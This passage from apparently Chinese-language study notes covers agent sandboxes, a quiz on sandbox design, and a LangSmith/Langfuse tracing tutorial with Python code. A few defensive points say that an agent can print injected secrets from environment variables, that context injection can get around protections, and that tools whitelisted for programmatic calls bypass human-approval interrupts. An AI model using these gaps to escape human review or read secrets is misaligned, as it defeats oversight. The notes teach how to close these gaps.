| 函数不可序列化 | Java `transient` 字段 / Lambda 反序列化丢失 | 跨边界只存数据不存行为 |
| `LocalDockerSandbox`（自实现） | 自己写一个 RPC 客户端调 Docker daemon | 🔴 官方没现成，按协议自己写 |
| `blockNetwork`（Modal）/ `--network none`（Docker） | 防火墙出站全拒 / Security Group egress deny | 物理断网最安全 |

---

#### 万物云口径（按真实，三色标注，没明确说的标🔴不编）

按已锁定事实（见 MEMORY 锁定）：

| 项目 | 口径 | 标注 |
|---|---|---|
| 万物云用没用 Deep Agents | **没用**。万物云用 LangGraph StateGraph + `create_agent` 自建（不是 `create_deep_agent`） | 🟢 确认 |
| 万物云用没用 Deep Agents Sandbox backend | **没用**（因为没用 Deep Agents） | 🟢 推断（基于上一条） |
| 万物云用没用 QuickJS Interpreter | **没用**（QuickJS 是 Deep Agents 中间件） | 🟢 推断（基于上一条） |
| 万物云代码执行沙箱用什么 | **🔴 待核**。万物云公开材料里没明确提"沙箱"用的什么方案。可能是自建 Docker、可能用 E2B、可能根本不需要（如果 Agent 不跑代码只调业务工具）。**绝不编** | 🔴 待核 |
| 万物云 Agent 是否需要跑代码 | 🔴 待核。从已知"物业工单/智能问答"场景看，更像是调业务工具（创建工单、查知识库），**可能不需要沙箱**。但不确认 | 🔴 待核 |
| 万物云人工审核 + execute 的组合 | 不适用（没用 Deep Agents 的 execute 工具） | 🟢 推断 |
| 万物云用 interrupt_before 做人工审核 | 是。但这跟沙箱无关，是工具调用前的暂停 | 🟢 确认 |

**面试话术建议**（按 🔴 不编原则）：
> "万物云的 Agent 主要做物业工单和智能问答，从公开材料看更像调业务工具（建工单、查知识库），不像有代码执行需求。沙箱这块万物云没公开说用什么方案，我标'待核'。**如果**万物云未来要加代码执行能力（比如让 Agent 写 SQL 临时分析数据），按 Deep Agents 官方推荐应该是 sandbox-as-tool 模式 + LangSmith/E2B 云沙箱 + 密钥留宿主机 + 网络隔离 + TTL 兜底；如果数据合规要求不出内网，则自建 Docker backend 按 `SandboxBackendProtocol` 实现，加 `--network none` + `--memory` + `--cpus` + `--cap-drop ALL`。这套是我从 Deep Agents 官方文档读到的方案，不是万物云的实际做法。"

---

#### 第27步检查题（5道，含预判疑问）

**题 1**：沙箱（Sandbox backend）和解释器（Interpreter）都是"跑代码"，到底啥区别？什么时候用哪个？

> 预判疑问：你说沙箱能跑 shell、解释器不能，但 Interpreter 不也能 `console.log` 算数吗？为啥不直接用 interpreter 跑 Python？

**题 2**：官方说"Never put secrets inside a sandbox"，但我 Agent 就是要调一个需要 API key 的外部接口，怎么办？三种方案按推荐度排序，并说出每种的风险。

> 预判疑问：Auth Proxy 是啥？跟直接塞环境变量有啥区别？

**题 3**：你用 PTC 让 Agent 在 QuickJS 里循环调 `web_search`，白名单放了 `web_search` 和 `delete_file`。出啥问题？怎么改？

> 预判疑问：我不是开了 `interrupt_on={"delete_file": True}` 吗？为啥还拦不住？

**题 4**：thread-scoped 沙箱，用户跑到一半网断了，重连后你应该怎么找到原沙箱？只靠 `idle_ttl_seconds=3600` 兜底行不行？为什么必须 `finally` 块主动删？

> 预判疑问：TTL 兜底了，finally 不写也能 1 小时后自动清，省一行不行？

**题 5**：Interpreter `mode="thread"`，Agent 在 turn 1 通过 PTC 调了 `send_email` 发了邮件，turn 2 恢复 snapshot 后变量还在。如果我想"撤销"那封邮件，恢复 snapshot 能做到吗？为什么？正确的做法是什么？

> 预判疑问：snapshot 不就是"存档/读档"吗？读档为啥不能回滚邮件？

---

**答案要点**（写在题后供自查，但做题时先别看）：

- 题1：沙箱=独立 VM/容器跑 shell，能装包能联网；解释器=进程内 JS 引擎跑逻辑，无 IO 无网络。要 pip install/git clone/pytest 用沙箱；要循环/重试/数据转换/编排多工具用解释器。Interpreter 不能跑 Python，只跑 JS，且无 OS。
- 题2：① 密钥留宿主机工具里（推荐，密钥不进沙箱）② Auth Proxy 拦截出站请求自动加头（密钥在代理，Agent 看不到，但还没广泛支持）③ 必须注入时：最短 TTL+最小权限+全工具 HITL+限网络（不推荐，上下文注入能绕）。Auth Proxy ≠ 环境变量：环境变量 Agent 能 `print(os.environ)` 读出来；Auth Proxy 是 HTTP 透明代理，Agent 只看到"调一个 URL"，密钥在代理层加。
- 题3：`delete_file` 在 PTC 白名单里 = Agent 能在 JS 里循环删文件，而 `interrupt_on` 对 PTC 调用**不生效**🟢，HITL 拦不住。改法：把 `delete_file` 移出 PTC 白名单，只走正常 tool calling 路径（受 `interrupt_on` 拦截）；PTC 只留 `web_search` 这种安全/幂等工具。
- 题4：用 `thread_id` 给沙箱命名（`f"review-{thread_id}"`），重连时先 `client.list_sandboxes()` 按名字查重，找到就复用。**只靠 TTL 不行**：① TTL 是兜底不是主路径，1 小时内沙箱一直烧钱 ② 如果 `list_sandboxes` 找不到但旧沙箱还在（孤儿），TTL 才能清。`finally` 主动删是主清理路径，TTL 是"忘了 finally"的保险。
- 题5：**不能撤销**🟢。Snapshot 只恢复解释器**变量**，不回滚**外部副作用**。邮件已发就是发了，跟数据库事务回滚不撤销已发 HTTP 一个道理。正确做法：① 有副作用的工具**不放 PTC**，走正常路径+HITL ② 必须用 PTC 时，先在变量里"暂存意图"，turn 结束前用正常 tool call（带 HITL）真正发送 ③ 设计成可重试而非可撤销（如邮件带 message_id 幂等）。

---

### 第28步：可观测 trace（LangSmith / Langfuse / 自研）

> 一句话定位：agent 执行链路追踪 = 把"一次用户请求"拆成"LLM调用 / 工具调用 / 子agent / 检索"等多步 span，用 trace_id + parent_run_id 串成一棵树，落库后能按请求回放整条链路。来源标注：LangSmith 部分 🟢 官方文档确认（observability-concepts / quickstart / sample-traces / distributed-tracing / otel-gateway-trace-redaction / cost-tracking）；Langfuse 部分 🟢 官方 self-hosting 文档确认；OpenTelemetry 通用机制 🟡 通用网文 + 后端类比；万物云自研 trace 🔴 待核不编。

---

#### 为什么重要（痛点先讲）

传统 Java 后端的 bug，你打个断点、看一行堆栈就定位了。Agent 的 bug 不是这样：

1. **链路深、看不见**：用户问"帮我查下这个客户最近的工单"，agent 内部可能是 `路由 agent → 检索 agent(向量库) → 工具 agent(调万物云工单API) → 总结 agent(LLM)`，4 步嵌套，每步还可能调多次 LLM。出错了你只看到最终"抱歉，无法处理"，**完全不知道是哪一步崩的**。🟡

2. **LLM 调用是黑盒**：同样一个 prompt，模型这次返回 JSON 正确，下次返回带 markdown 的 JSON 解析失败。你不记下"当时给模型的完整 prompt + 模型返回的完整 raw response"，根本没法复现。🟢 LangSmith quickstart 原话："captures inputs, outputs, and metadata"

3. **成本失控**：agent 一个请求可能调 5 次 LLM、3 次工具，token 烧得飞快。没有 per-trace 的 token 账单，你月底收到账单才发现某个 prompt 把整本说明书塞进去了。🟢 cost-tracking.md："LangSmith automatically records LLM token usage and costs"

4. **多 agent / 多服务串联断链**：主 agent 调子 agent，子 agent 又调另一个微服务，trace 上下文不传过去，链路就断成两截，看不出因果关系。🟢 distributed-tracing.md 专门讲这个

5. **生产排查靠 println 必死**：agent 高并发跑，日志是交错的（线程 A 的工具调用夹在线程 B 的 LLM 调用中间），没有 trace_id 串，日志就是一锅粥。这跟 Spring 没有 traceId 时多线程日志没法看是一个道理。🟡

类比：你做 Spring Cloud 微服务没有 Sleuth/Zipkin，线上一个 500 错误你能查一周。Agent 没有 trace，比那个还惨——因为 LLM 的非确定性让你连"同样输入再跑一遍"都复现不了。🟡

---

#### 概念（是啥）

**trace（追踪）**：一次用户请求从头到尾的完整执行记录，由一个唯一 `trace_id` 标识。🟢 observability-concepts.md："A trace is a collection of runs for a single operation"

**run / span（运行/跨度）**：trace 里的一个原子操作——一次 LLM 调用、一次工具调用、一次检索、一次 prompt 拼接。每个 run 有 `run_id` + `parent_run_id`，组成树。🟢 "A run is a span representing a single unit of work... you can think of a run as a span"

**project（项目）**：一个应用/服务的所有 trace 容器。🟢

**thread（会话）**：多轮对话里，每一轮是一个 trace，但用同一个 `session_id` / `thread_id` metadata 串起来，形成一次完整会话。🟢

**数据模型层级**（LangSmith 🟢）：
```
Project
  └─ Trace (trace_id)           # 一次请求
       ├─ Run (run_id, parent=None)        # 根 span
       │    ├─ Run (parent=根)             # 子 span：检索
       │    │    └─ Run (parent=检索)      # 孙 span：向量库查询
       │    └─ Run (parent=根)             # 子 span：LLM 调用
       └─ Run ...                          # 同 trace 的其他 run
  └─ Trace ...                 # 同 project 的其他 trace
```

Langfuse 的对应模型 🟢（self-hosting.md 确认存储的是 traces/observations/scores）：trace 下面是 **observation**（等价 span），再加 **score**（评分，等价 LangSmith 的 feedback）。术语不同，结构同构。

**OpenTelemetry 映射** 🟢（observability-concepts.md 原话）：
- LangSmith trace ≈ OTel 的一组 span（a collection of spans）
- LangSmith run ≈ OTel 的一个 span
- 分布式追踪的 context propagation header ≈ OTel 的 `traceparent` / 这里叫 `langsmith-trace`

---

#### 深入（机制/原理，带三色）

**1. 自动埋点 vs 手动埋点**

🟢 observability-concepts.md 原话："LangSmith integrations provide automatic tracing for popular LLM providers and agent frameworks (the equivalent of auto-instrumentation in general observability)."

- **自动埋点（integration）**：你用 LangChain/LangGraph/create_agent，设个环境变量 `LANGSMITH_TRACING=true`，框架自动给每次 LLM 调用、每次工具调用包一个 span。零代码改动。🟢
- **手动埋点（manual instrumentation）**：你有自己写的代码（比如自建 MCP、自建检索），integration 管不到，就要手动用三种机制之一：🟢
  - `@traceable` 装饰器：给任意函数包一层 span（最常用）
  - `trace` 上下文管理器（Python only）：包一段代码块
  - `RunTree` API：底层手工拼 span 树（最灵活最啰嗦）

后端类比 🟡：自动埋点 = Spring Sleuth 自动给所有 @RestController/@FeignClient 加 traceId；手动 `@traceable` = 你自己写个 `@Trace` 注解 + AOP @Around 切面，把切到的方法变成一个 span。完全一样的思路。

**2. parent-child 怎么串成树（核心机制）**

这是 trace 的灵魂。机制是**隐式上下文传播** 🟢（quickstart 里 `@traceable` 嵌套调用自动形成 nested span 就是靠这个）：

- 框架用一个 **contextvar**（Python）保存"当前正在执行的 run"。🟡 具体是 contextvar 这是 LangChain 实现细节，我没在官方 doc 抓到原文，标黄
- 当 `assistant()`（被 `@traceable` 包裹）开始执行，框架创建一个 root run，把它塞进 contextvar
- `assistant()` 内部调用 `get_context()`（也被 `@traceable` 包裹），`get_context` 的装饰器从 contextvar 读出"当前 run"作为自己的 `parent_run_id`，创建子 run，再把自己塞进 contextvar
- `get_context()` 返回后，contextvar 恢复成 `assistant` 的 run

后端类比 🟡：
- Python 的 contextvar ≈ Java 的 `ThreadLocal`（但 contextvar 对 asyncio 协程友好，ThreadLocal 对线程友好）
- 这个机制 ≈ Spring Sleuth 在 `ThreadLocal` 里存当前 span，子调用读 ThreadLocal 拿 parent
- 跨线程/跨协程要显式传递上下文，否则断链——这跟 Java 用 `MDC` 跨线程池要 wrap Runnable 是一个坑

**3. 跨服务/跨进程 trace 上下文传播（distributed tracing）**

🟢 distributed-tracing.md 原文：用 HTTP 头 `langsmith-trace`（携带 trace_id + parent run 信息）+ 可选 `baggage`（携带 metadata/tags）传播。

流程：
1. 客户端：`get_current_run_tree().to_headers()` 把当前 run 序列化成 header
2. 客户端：把 header 塞进 HTTP 请求
3. 服务端：`TracingMiddleware`（FastAPI/Starlette）拦截请求，读 header，恢复 parent 上下文
4. 服务端：服务端的 `@traceable` 函数创建的 run，parent 指向客户端那个 run

🟢 官方强警告（distributed-tracing.md Warning 原话）："Only accept distributed-tracing headers from trusted services... Do not add TracingMiddleware on a service that receives requests directly from untrusted third parties or the public internet... strip these headers from untrusted inbound requests at your gateway or proxy."

后端类比 🟡：这就是 Spring Cloud Sleuth 的 `X-B3-TraceId` / `X-B3-SpanId` HTTP 头传播，一模一样。警告也是同一个坑——别让外网用户伪造 traceId 污染你的链路。

**4. 采样（sampling）**

🟢 sample-traces.md：
- 全局：`LANGSMITH_TRACING_SAMPLING_RATE=0.75` 表示采 75% 的 trace（0=不采，1=全采，默认全采）
- 细粒度：给不同 `Client` 实例设不同 `tracing_sampling_rate`，用 `tracing_context(client=...)` 切换

🟢 sample-traces.md 区分两种降量策略：
- **sampling（采样）**= 概率性，适合"量太大，统计上够用就行"
- **conditional tracing（条件追踪）**= 确定性，按业务逻辑决定记不记。场景：零留存策略的客户不记、敏感数据不记、按租户路由到不同 project

后端类比 🟡：采样率 ≈ Sleuth 的 `spring.sleuth.sampler.probability=0.1`；conditional tracing ≈ 你写个 Filter 判断 `if (request.getHeader("X-Tenant")=="敏感租户") 不埋点`。

**5. 敏感信息脱敏**

两种做法 🟢：
- **OTel Gateway 架构**（otel-gateway-trace-redaction.md）：trace 不直发 LangSmith，先发到你自己的 OpenTelemetry collector，collector 里用 transform processor 把 `gen_ai.prompt`、`gen_ai.completion` 这些字段替换成 `[REDACTED]`，再转发给 LangSmith。架构：App →(OTLP/HTTP)→ Collector(redact) →(OTLP/HTTP)→ LangSmith。
- **应用内脱敏**：官方提了 "Prevent logging of sensitive data in traces"（mask-inputs-outputs 页，我没抓全文，标黄引用存在 🟢 页面存在 / 具体字段名 🔴）

环境变量 🟢：`LANGSMITH_OTEL_ENABLED=true` + `LANGSMITH_OTEL_ONLY=true` + `OTEL_EXPORTER_OTLP_ENDPOINT=http://你的collector:4318`

**6. 成本追踪**

🟢 cost-tracking.md：LangSmith 自动按主要 provider 记录 LLM token 用量和成本，分三类：
- Input：prompt 里的 token（缓存读、文本、图片等子类）
- Output：模型返回的 token（reasoning token、文本等子类）
- Other：工具调用、检索步骤等自定义 run 的成本

可在三处看：单 trace 内的 trace tree（最细）、project stats（聚合）、dashboards（趋势）。🟢

**7. Langfuse 的存储架构差异（对比 LangSmith）**

🟢 Langfuse self-hosting.md 明确的架构：
- **Langfuse Web**（主应用，UI + API）+ **Langfuse Worker**（异步处理事件）两个容器
- 存储：**Postgres**（事务型主库）+ **ClickHouse**（OLAP，存 traces/observations/scores）+ **Redis/Valkey**（缓存 + 队列）+ **S3/Blob**（原始事件持久化）
- **队列化摄入** 🟢：trace 批量到 Web → 先写 S3 → Redis 排队 → Worker 取出 → 入 ClickHouse。官方说这样"高突峰不会因数据库瓶颈超时"
- 开源，Docker Compose（小规模）/ K8s Helm / AWS/Azure/GCP Terraform（生产）
- 跟 Langfuse Cloud 同一份代码

后端类比 🟡：Langfuse 的"先写 S3 再异步入 ClickHouse" ≈ 你写日志系统时"先写 Kafka（不丢）再异步消费写 ES"。ClickHouse 存 trace ≈ ES 存日志，都是 OLAP 读多写批的场景。

---

#### 生产实战（伪代码 + 逐行解释，每行注释）

下面给三段生产伪代码，从简到繁。语言用 Python（LangChain/LangGraph 生态主语言），关键处给 Java 后端类比注释。

---

**【实战 1】LangSmith 自动埋点（最简，零代码改动）**

```python
# ===== 应用代码本身不需要任何 trace 相关 import =====
# 只靠环境变量开启自动埋点 🟢 quickstart.md
import os
os.environ["LANGSMITH_TRACING"] = "true"              # 总开关，开启自动 trace
os.environ["LANGSMITH_API_KEY"] = "ls_xxx"             # LangSmith API key
os.environ["LANGSMITH_PROJECT"] = "wuyue-agent-prod"   # 落到哪个 project（不设则 default）
os.environ["LANGSMITH_ENDPOINT"] = "https://apac.api.smith.langchain.com"  # 区域端点，账号不在 US 必须设 🟢
os.environ["LANGSMITH_TRACING_SAMPLING_RATE"] = "0.3"  # 生产采样 30% 🟢 sample-traces.md

from langchain.agents import create_agent
from langchain_openai import ChatOpenAI

agent = create_agent(                                  # 用 create_agent（万物云也用这个 🟢）
    model=ChatOpenAI(model="gpt-4o"),
    tools=[...],
)
# 这一行 invoke，框架自动生成一棵 trace 树：
# root run(create_agent.invoke) → child run(LLM call) → child run(tool call) → ...
agent.invoke({"messages": [{"role": "user", "content": "查客户001的工单"}]})
```

逐行解释：
- `LANGSMITH_TRACING=true` 🟢：LangChain/LangGraph 的 integration 监听这个环境变量，true 就给所有 LLM 调用/工具调用自动包 span。**这一行是万物云这类用 LangGraph 的项目开 trace 的最便宜方式**。
- `LANGSMITH_PROJECT` 🟢：trace 按 project 分组。生产建议按环境分（`-prod` / `-staging`）。
- `LANGSMITH_ENDPOINT` 🟢：quickstart 明确，账号不在 US（默认区域）必须设，否则 key 认证失败。万物云在国内的话要注意区域。
- `LANGSMITH_TRACING_SAMPLING_RATE=0.3` 🟢：高 QPS 下采样降本。0.3 = 30% 请求被记 trace。

后端类比 🟡：这四行环境变量 ≈ Spring Boot 里 `logging.level.org.springframework.cloud.sleuth=DEBUG` + `spring.sleuth.sampler.probability=0.3`，改配置不改代码。

---

**【实战 2】手动埋点：给自建工具加 span + metadata/tags + 嵌套**

万物云自建 MCP 工具 integration 抓不到，要手动埋点 🟡（integration 抓不到是通用的；万物云自建 MCP 🟢）。

```python
from langsmith import traceable, Client
import httpx

# 给自建 MCP 工具加 trace 🟢 @traceable 是官方推荐手动埋点方式
@traceable(
    run_type="tool",                       # span 类型：tool/llm/retrieval/chain/embedding 🟢
    name="mcp_query_ticket",               # span 名字，UI 里显示
    tags=["mcp", "ticket-domain"],         # tag：可过滤可分组 🟢 observability-concepts "Tags"
    metadata={                             # metadata：键值对，可过滤 🟢
        "version": "v2.3",
        "domain": "property",
    },
)
def query_ticket(customer_id: str) -> dict:
    # 这个 httpx 调用本身不是 @traceable，但它会被包在父 span 里
    resp = httpx.post(
        "http://mcp-internal/mcp/tools/call",
        json={"tool": "get_ticket", "args": {"cid": customer_id}},
        timeout=10.0,
    )
    resp.raise_for_status()
    return resp.json()

# 嵌套：assistant 调 query_ticket，自动形成 parent-child 树 🟢 quickstart 同款结构
@traceable(name="ticket_assistant")
def assistant(question: str) -> str:
    cid = extract_customer_id(question)    # 普通函数，不埋点（太细没必要）
    ticket = query_ticket(cid)             # 嵌套调用，query_ticket 的 parent = assistant 的 run
    # 这里再调 LLM（被 wrap 过的 client 会自动加 LLM span，parent 也是 assistant）
    answer = llm_client.chat.completions.create(...)
    return answer

# 生产：按租户条件关掉 trace（敏感租户不记）🟢 conditional tracing 思路
from langsmith import tracing_context
sensitive_client = Client(tracing_sampling_rate=0.0)   # 0=完全不记 🟢 sample-traces.md
def handle_request(tenant_id: str, q: str):
    if tenant_id in SENSITIVE_TENANTS:
        with tracing_context(client=sensitive_client):  # 这段代码不产生任何 trace
            return assistant(q)
    return assistant(q)
```

逐行解释：
- `@traceable(run_type="tool")` 🟢：把这个函数记成一个 tool 类型的 span。run_type 在 UI 里用图标区分（锤子=tool，大脑=llm，放大镜=retrieval）。
- `tags=["mcp","ticket-domain"]` 🟢：tag 是字符串列表，UI 里能按 tag 过滤。生产强烈建议每个工具打 domain tag，排查时一把捞出"所有工单域的 trace"。
- `metadata={"version":"v2.3"}` 🟢：metadata 是键值对。版本号灰度时特别有用——`metadata.version=v2.3` 一过滤就知道新版本是不是更慢了。
- `assistant` 调 `query_ticket` 🟢：嵌套调用时，`@traceable` 自动从 contextvar 读 parent，`query_ticket` 的 span 的 `parent_run_id` = `assistant` 的 run_id。**这就是 trace 树的形成机制**。
- `tracing_context(client=sensitive_client)` 🟢：sample-traces.md 的 per-client 采样。`tracing_sampling_rate=0.0` = 这个 client 下完全不记 trace。敏感租户用这个。

后端类比 🟡：
- `@traceable` ≈ 自定义 `@Trace` 注解 + Spring AOP `@Around` 切面，切面里 `span = tracer.nextSpan().name("xxx").start()`，`try { return pjp.proceed(); } finally { span.end(); }`
- `tags/metadata` ≈ Sleuth 给 span 加 tag：`span.tag("version","v2.3")`
- `tracing_context(client=...)` ≈ 你用 `MDC.put("sample", "false")` 配合自定义 sampler 动态关采样

---

**【实战 3】跨服务分布式 trace（agent 服务 A → 检索微服务 B）**

主 agent 在服务 A，检索在独立的检索微服务 B，trace 要跨过去不断链。

```python
# ===== 服务 A（客户端，主 agent）=====
from langsmith.run_helpers import get_current_run_tree, traceable
import httpx

@traceable(name="rag_service_a")
async def search_in_service_b(query: str) -> list:
    headers = {}
    if run_tree := get_current_run_tree():           # 取当前 run 🟢 distributed-tracing.md
        headers.update(run_tree.to_headers())        # 序列化成 langsmith-trace + baggage 头 🟢
    async with httpx.AsyncClient(base_url="http://retrieval-svc") as client:
        resp = await client.post("/search", json={"q": query}, headers=headers)
        return resp.json()["docs"]
```

```python
# ===== 服务 B（服务端，检索微服务）=====
from langsmith.middleware import TracingMiddleware   # 🟢 langsmith>=0.1.133
from fastapi import FastAPI
from langsmith import traceable

app = FastAPI()
app.add_middleware(TracingMiddleware)                # 自动从请求头恢复 parent 上下文 🟢

@app.post("/search")
@traceable(name="retrieval_svc_search", run_type="retrieval")
async def search(req: dict):
    docs = vector_db.search(req["q"])                # 这个调用的 parent = 服务 A 的 run
    return {"docs": docs}
```

逐行解释：
- `get_current_run_tree()` 🟢：拿当前上下文里的 run 对象。没有就是 None（不在 trace 里）。
- `run_tree.to_headers()` 🟢：把 run 的 trace_id / parent run_id 等序列化成 `langsmith-trace` header，metadata/tags 进 `baggage` header。
- 服务 B 的 `TracingMiddleware` 🟢：FastAPI 中间件，拦截所有请求，从 header 恢复 parent run 上下文塞进 contextvar。这样服务 B 里 `@traceable` 创建的 span 自动挂到服务 A 的 run 下。
- **生产红线** 🟢：distributed-tracing.md Warning——`TracingMiddleware` 只能加在**内部可信服务**上，**不能**直接面向公网。网关/代理层要把外部来的 `langsmith-trace`/`baggage` 头剥掉，否则外部攻击者能伪造 traceId 污染你的链路。

后端类比 🟡：这套 ≈ Sleuth 的 `X-B3-TraceId` 透传，`TracingMiddleware` ≈ Spring 的 `TracingFilter`。安全坑也一样——Sleuth 文档也警告别信外网来的 B3 头。

---

**【实战 4】自研 trace（万物云路线，🔴 待核具体实现）**

万物云"只了解 LangSmith/Langfuse 没用"🟢（用户给定事实），自研 trace 🔴 待核不编。下面给一个**通用自研 trace 骨架**（🟡 通用后端模式，不是万物云真实代码），让你理解自研要造哪些轮子。

```python
# ===== 自研 trace 核心数据结构 🟡 通用模式 =====
import uuid, time, json, threading, queue, re
from contextvars import ContextVar                   # Python 协程安全的"ThreadLocal"

current_span: ContextVar = ContextVar("current_span", default=None)

class Span:
    def __init__(self, name, span_type="tool", parent=None):
        self.trace_id = parent.trace_id if parent else str(uuid.uuid4())  # 同 trace 共享 trace_id
        self.span_id = str(uuid.uuid4())            # 本 span 唯一 id
        self.parent_span_id = parent.span_id if parent else None          # 父 span id
        self.name = name
        self.span_type = span_type
        self.start_ts = time.time()
        self.end_ts = None
        self.attributes = {}                         # 业务字段（对应 LangSmith metadata）
        self.status = "ok"
        self.events = []                             # 异常事件

    def end(self):
        self.end_ts = time.time()
        TraceExporter.enqueue(self)                  # 异步上报，不阻塞业务 🟡

    def set_attr(self, k, v):
        self.attributes[k] = v

    def to_dict(self):
        return {
            "trace_id": self.trace_id, "span_id": self.span_id,
            "parent_span_id": self.parent_span_id,
            "name": self.name, "type": self.span_type,
            "start_ts": self.start_ts, "end_ts": self.end_ts,
            "duration_ms": int((self.end_ts - self.start_ts) * 1000),
            "attributes": self.attributes, "status": self.status,
        }

# ===== 装饰器（对应 @traceable）🟡 =====
def traceable(name=None, span_type="tool"):
    def deco(fn):
        def wrapper(*args, **kwargs):
            parent = current_span.get()
            span = Span(name or fn.__name__, span_type, parent=parent)
            token = current_span.set(span)           # 把自己塞进 contextvar，子调用能读到
            try:
                result = fn(*args, **kwargs)
                return result
            except Exception as e:
                span.status = "error"
                span.events.append({"exception": str(e), "ts": time.time()})
                raise
            finally:
                current_span.reset(token)            # 恢复父 span 🟡 关键：否则断链
                span.end()
        return wrapper
    return deco

# ===== 异步批量上报（对应 Langfuse 的 Worker 模式）🟡 =====
class TraceExporter:
    _q = queue.Queue(maxsize=100_000)                # 有界队列，防 OOM 🟡

    @classmethod
    def enqueue(cls, span):
        try:
            cls._q.put_nowait(span.to_dict())        # 非阻塞入队，满了就丢（trace 不阻塞业务）
        except queue.Full:
            pass                                     # 丢 trace 不能影响业务 🟡

    @classmethod
    def _worker(cls):
        batch = []
        while True:
            try:
                item = cls._q.get(timeout=2.0)
                batch.append(item)
                if len(batch) >= 50:                 # 攒 50 条一批
                    cls._flush(batch); batch = []
            except queue.Empty:
                if batch:
                    cls._flush(batch); batch = []

    @classmethod
    def _flush(cls, batch):
        # 脱敏（对应 OTel collector redact）🟡
        redacted = [redact_sensitive(s) for s in batch]
        # 写 ClickHouse / Postgres（对应 Langfuse 的存储层）🟡
        try:
            clickhouse_client.insert("spans", redacted)
        except Exception:
            pass                                     # 上报失败不重试不抛（fire-and-forget）🟡

threading.Thread(target=TraceExporter._worker, daemon=True).start()

# ===== 脱敏 🟡 =====
PHONE_RE = re.compile(r'1[3-9]\d{9}')
IDCARD_RE = re.compile(r'\d{17}[\dXx]')
def redact_sensitive(span_dict):
    s = json.dumps(span_dict["attributes"], ensure_ascii=False)
    s = PHONE_RE.sub("[PHONE]", s)
    s = IDCARD_RE.sub("[IDCARD]", s)
    span_dict["attributes"] = json.loads(s)
    # 对 LLM 的 prompt/completion 也要脱敏（对应 OTel redact gen_ai.prompt 🟢）
    return span_dict

# ===== 跨服务传播（对应 langsmith-trace header）🟡 =====
def inject_headers(headers):
    """客户端：把当前 span 注入 HTTP 头"""
    if span := current_span.get():
        headers["x-trace-id"] = span.trace_id
        headers["x-parent-span-id"] = span.span_id

def extract_headers(headers):
    """服务端：从 HTTP 头恢复 parent span 上下文"""
    trace_id = headers.get("x-trace-id")
    parent_id = headers.get("x-parent-span-id")
    if trace_id:
        fake_parent = Span.__new__(Span)
        fake_parent.trace_id = trace_id
        fake_parent.span_id = parent_id
        current_span.set(fake_parent)                # 后续 @traceable 会以此为 parent
```

逐行解释（重点行）：
- `trace_id = parent.trace_id if parent else 新建` 🟡：**根 span 生成 trace_id，子 span 继承**。这是 trace 树的根。同一次请求所有 span 共享 trace_id。
- `parent_span_id = parent.span_id` 🟡：每个 span 记父 span 的 id。没有这字段树就建不起来。
- `current_span: ContextVar` 🟡：Python 协程安全版 ThreadLocal。`@traceable` 靠它读 parent。这是自动埋点的核心机制。
- `token = current_span.set(span)` + `current_span.reset(token)` 🟡：进函数设自己，出函数恢复父。**忘了 reset 会串链**——这是自研最容易踩的坑。
- `_q = queue.Queue(maxsize=100_000)` 🟡：有界队列。trace 量爆炸时宁可丢 trace 也不能 OOM 拖垮业务。
- `cls._q.put_nowait(...)` + `except queue.Full: pass` 🟡：**trace 永远不阻塞业务**。这是 trace 系统的铁律——可观测性不能拖累主流程。
- `_flush` 里 `except: pass` 🟡：上报失败不重试不抛。trace 丢了业务照跑，只是可观测性受损。
- `redact_sensitive` 🟡：入库前正则脱敏手机号/身份证。对应 LangSmith OTel collector redact 的 `gen_ai.prompt`/`gen_ai.completion` 替换 🟢。
- `inject_headers` / `extract_headers` 🟡：跨服务传播。对应 LangSmith 的 `run_tree.to_headers()` + `TracingMiddleware` 🟢。

后端类比 🟡：
- `ContextVar` ≈ Java `ThreadLocal`（但 asyncio 友好）
- `Span` 类 ≈ Brave/Sleuth 的 `Span` 对象
- `TraceExporter._worker` 后台线程 ≈ Logback `AsyncAppender` 的队列 + 消费线程
- `_flush` 批量写 ClickHouse ≈ Kafka 异步消费批量写 ES
- `inject_headers`/`extract_headers` ≈ Sleuth 的 `X-B3-TraceId` 注入/解析

---

#### 生产注意（坑 + 对策，表格）

| 坑 | 现象 | 对策 | 来源 |
|---|---|---|---|
| trace 开销拖慢业务 | 高 QPS 下每请求多花几十 ms 在序列化+网络上报 | 异步队列 + 采样。trace 永远 fire-and-forget，丢了不影响业务 | 🟡 通用 / 🟢 Langfuse 队列化摄入 |
| 采样率定太高 | LangSmith/Langfuse 账单爆炸 / 自研 ClickHouse 撑爆 | 生产从 0.1~0.3 起步；出错/慢请求必采（conditional 强制采） | 🟢 sample-traces.md |
| 敏感信息进 trace | 用户身份证/手机号/prompt 里的隐私进了 LangSmith 云端 | OTel Gateway collector 脱敏 `gen_ai.prompt`/`gen_ai.completion` 再转发；或自研入库前正则脱敏 | 🟢 otel-gateway-trace-redaction.md |
| 跨服务 trace 断链 | 服务 A 的 trace 和服务 B 的 trace 各自一棵树，看不出因果关系 | 注入/解析 `langsmith-trace` header（或自研 `x-trace-id`）；服务端加 `TracingMiddleware` | 🟢 distributed-tracing.md |
| 外网伪造 traceId | 公网请求带恶意 `langsmith-trace`/`baggage` 头污染链路 | 网关/代理层剥掉外部来的 trace 头；`TracingMiddleware` 只加在内部可信服务 | 🟢 distributed-tracing.md Warning |
| trace 过大被拒 | 单 trace 超 25,000 个 run，LangSmith 直接拒收 | 拆 trace（按 thread 分轮）；减少无意义嵌套 span | 🟢 observability-concepts.md（25000 上限）|
| contextvar/ThreadLocal 没 reset | 协程/线程池复用，span 串到下一个请求，链路乱 | `try/finally` 里必须 reset；线程池 wrap Runnable 传递上下文 | 🟡 通用并发坑 |
| 异步上报丢 trace | 进程崩溃，队列里没 flush 的 trace 丢 | 可接受（trace 不要求精确）。要更稳就学 Langfuse：先写 S3 再入库 | 🟢 Langfuse S3 持久化 |
| LLM 调用没记 token | 成本算不清 | 用 integration 自动记（LangChain/LLM wrapper）；自建 LLM 调用要手动塞 token 用量到 span attributes | 🟢 cost-tracking.md |
| 子 agent trace 太深 | recursion_limit 触发 / trace 树太深看不懂 | 子 agent 用独立 trace + parent trace_id 关联，而非无限嵌套 | 🟡 |

---

#### 后端类比（Agent 概念 | 后端类比 | 说明）

| Agent trace 概念 | 后端类比（Spring/Activiti/Redis/JUC） | 说明 |
|---|---|---|
| trace（一次请求链路） | Spring Cloud Sleuth 的 Trace / Zipkin 一个请求的完整调用链 | 一次用户输入从头到尾 |
| run / span（原子操作） | Sleuth 的 Span / Spring AOP 一个 @Around 切面包裹的方法 | 一次 LLM 调用 / 一次工具调用 |
| parent_run_id（父子关系） | Sleuth span 的 parentId | 组成树的关键字段 |
